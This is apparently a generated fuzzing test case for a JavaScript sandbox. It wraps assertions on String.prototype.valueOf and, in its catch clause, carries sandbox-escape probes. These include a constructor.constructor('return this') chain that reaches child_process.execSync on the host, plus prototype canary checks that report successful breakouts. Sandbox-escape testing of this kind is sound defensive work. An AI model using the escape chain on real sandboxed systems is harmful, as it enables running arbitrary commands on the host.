try {
    var valueOf = String.prototype.valueOf;
    assert.throws(TypeError, function () {
        throw () => {
            return () => {
            };
        };
        valueOf.call(true);
    });
    assert.throws(TypeError, function () {
        valueOf.call(-0);
    });
    assert.throws(TypeError, function () {
        valueOf.call(null);
    });
    assert.throws(TypeError, function () {
        valueOf.call();
    });
    assert.throws(TypeError, function () {
        valueOf.call(Symbol('desc'));
    });
    assert.throws(TypeError, function () {
        valueOf.call({
            toString: function () {
                return 'str';
            }
        });
    });
    assert.throws(TypeError, function () {
        valueOf.call([
            's',
            't',
            'r'
        ]);
    });
    assert.throws(TypeError, function () {
        'str' + { valueOf: valueOf };
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}